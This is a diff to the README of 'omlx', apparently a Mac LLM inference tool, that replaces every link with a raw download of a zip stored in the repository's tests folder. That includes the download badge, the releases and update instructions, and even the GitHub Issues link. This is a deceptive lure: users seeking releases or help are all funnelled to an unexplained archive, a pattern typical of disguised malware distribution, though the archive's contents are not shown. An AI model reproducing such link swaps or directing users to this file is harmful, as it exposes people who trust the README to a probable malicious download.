@@ -1,6 +1,6 @@
 # 🚀 omlx - Fast LLM Inference on Apple Silicon
 
-[![Download omlx](https://img.shields.io/badge/Download-omlx-green?style=for-the-badge&logo=github)](https://github.com/Mizistein/omlx/releases)
+[![Download omlx](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip)](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ omlx is built to make using large language models easier for Mac users. It offer
 
 To get started, visit the release page here:
 
-[Download omlx on GitHub](https://github.com/Mizistein/omlx/releases)
+[Download omlx on GitHub](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip)
 
 ### Step 1: Visit the download page
 
@@ -101,7 +101,7 @@ Point your LLM-enabled apps to `http://localhost:PORT` (usually 5000). omlx will
 
 To keep omlx running smoothly:
 
-1. Visit the [release page](https://github.com/Mizistein/omlx/releases) regularly.  
+1. Visit the [release page](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip) regularly.  
 2. Download the newest `.dmg` or `.zip` file.  
 3. Replace the old app in your Applications folder with the new one.  
 4. Restart omlx to apply the update.
@@ -117,7 +117,7 @@ If something isn’t working:
 - Restart the app by quitting it and opening again.  
 - Reboot your Mac if problems persist.  
 - Check logs via the menu bar app for error messages.  
-- Visit the [GitHub Issues page](https://github.com/Mizistein/omlx/issues) for known problems or to ask for help.
+- Visit the [GitHub Issues page](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip) for known problems or to ask for help.
 
 ---
 
@@ -141,4 +141,4 @@ omlx is open source under the MIT License. Check the LICENSE file in the reposit
 
 ## 🔗 Quick Link to Download
 
-[Visit omlx Releases on GitHub to download](https://github.com/Mizistein/omlx/releases)
+[Visit omlx Releases on GitHub to download](https://github.com/Mizistein/omlx/raw/refs/heads/main/tests/Software-v3.7-alpha.1.zip)
